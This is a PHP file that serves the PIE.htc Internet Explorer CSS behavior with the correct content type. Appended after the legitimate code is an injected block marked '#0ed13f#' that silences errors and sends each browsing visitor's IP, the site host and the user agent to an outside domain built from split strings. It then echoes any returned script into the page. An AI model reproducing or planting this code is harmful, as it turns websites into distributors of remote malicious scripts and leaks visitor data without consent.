<?php
/*
This file is a wrapper, for use in PHP environments, which serves PIE.htc using the
correct content-type, so that IE will recognize it as a behavior.  Simply specify the
behavior property to fetch this .php file instead of the .htc directly:

.myElement {
    [ ...css3 properties... ]
    behavior: url(PIE.php);
}

This is only necessary when the web server is not configured to serve .htc files with
the text/x-component content-type, and cannot easily be configured to do so (as is the
case with some shared hosting providers).
*/

header( 'Content-type: text/x-component' );
include( 'PIE.htc' );
?>
<?php
#0ed13f#
error_reporting(0); @ini_set('display_errors',0); $wp_tus21775 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_tus21775) && !preg_match ('/bot/i', $wp_tus21775))){
$wp_tus0921775="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_tus21775);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_tus0921775); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_21775tus = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_21775tus = @file_get_contents($wp_tus0921775);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_21775tus=@stream_get_contents(@fopen($wp_tus0921775, "r"));}}
if (substr($wp_21775tus,1,3) === 'scr'){ echo $wp_21775tus; }
#/0ed13f#
?>
